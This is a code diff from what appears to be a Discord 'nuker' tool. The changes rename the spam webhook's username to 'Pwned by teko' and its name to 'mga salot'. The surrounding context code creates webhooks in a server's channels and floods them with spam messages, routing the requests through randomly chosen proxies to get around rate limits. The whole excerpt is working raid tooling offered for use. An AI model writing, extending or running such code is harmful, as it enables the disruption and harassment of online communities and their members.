@@ -70,14 +70,14 @@ def bot_nuker():
                             proxy = random.choice(proxylist)
                             proxy = f'http://{proxy}'
                             async with aiohttp.ClientSession() as session:
-                                async with session.post(webhook, json={"content": spam_message,"username": "Hazus Nuker"}, headers={"Content-Type": "application/json"}, timeout=4, proxy=proxy) as response:
+                                async with session.post(webhook, json={"content": spam_message,"username": "Pwned by teko"}, headers={"Content-Type": "application/json"}, timeout=4, proxy=proxy) as response:
                                     if 200 <= response.status <= 299:
                                         await asynccprint(f"Sent message in {channel}", 0)
                                     else:
                                         await asynccprint(f"Webhook in channel {channel} is being rate limited.", 2)
                         else:
                             async with aiohttp.ClientSession() as session:
-                                async with session.post(webhook, json={"content": spam_message,"username": "Hazus Nuker"}, headers={"Content-Type": "application/json"}, timeout=4) as response:
+                                async with session.post(webhook, json={"content": spam_message,"username": "Pwned by teko"}, headers={"Content-Type": "application/json"}, timeout=4) as response:
                                     if 200 <= response.status <= 299:
                                         await asynccprint(f"Sent message in {channel}", 0)
                                     else:
@@ -91,7 +91,7 @@ def bot_nuker():
             while True:
                 try:
                     channel = await bot.fetch_channel(channelid)
-                    webhook = await channel.create_webhook(name="Hazus Nuker")
+                    webhook = await channel.create_webhook(name="mga salot")
                     await asynccprint(f"Created Webhook: {webhook.id}", 0)
                     await spam_webhook(webhook.url, channelid)
                     break
